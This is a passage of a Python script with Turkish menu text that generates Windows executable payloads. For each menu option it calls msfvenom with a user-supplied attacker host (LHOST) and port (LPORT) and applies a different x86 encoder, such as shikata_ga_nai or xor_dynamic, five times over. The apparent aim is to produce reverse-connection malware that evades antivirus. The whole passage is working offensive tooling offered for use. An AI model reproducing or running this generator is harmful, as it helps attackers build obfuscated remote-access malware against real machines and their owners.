        elif encoder == '13':
            e13 = 'x86/fnstenv_mov'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e13} -i 5')
        elif encoder == '14':
            e14 = 'x86/jmp_call_additive'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e14} -i 5')
        elif encoder == '15':
            e15 = 'x86/nonalpha'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e15} -i 5')
        elif encoder == '16':
            e16 = 'x86/nonupper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e16} -i 5')
        elif encoder == '17':
            e17 = 'x86/opt_sub'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e17} -i 5')
        elif encoder == '18':
            e18 = 'x86/service'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e18} -i 5')
        elif encoder == '19':
            e19 = 'x86/shikata_ga_nai'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e19} -i 5')
        elif encoder == '20':
            e20 = 'x86/single_static_bit'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e20} -i 5')
        elif encoder == '21':
            e21 = 'x86/unicode_mixed'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e21} -i 5')
        elif encoder == '22':
            e22 = 'x86/unicode_upper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e22} -i 5')
        elif encoder == '23':
            e23 = 'x86/xor_dynamic'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p14} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e23} -i 5')
        else:
            print(f'{BLUE}===============================================')
            print('HATALI TUŞLAMA!')
            print(f'{BLUE}===============================================')
    else:
        print(f'{BLUE}===============================================')
        print(f'{RED}HATALI TUŞLAMA!')
        print(f'{BLUE}===============================================')
elif secenek1 == '02':
    print(f'{RED}ÇOK YAKINDA!')
else:
    print(f'{RED}HATALI TUŞLAMA!')
    print(f'{BLUE}===============================================')
##################################################################
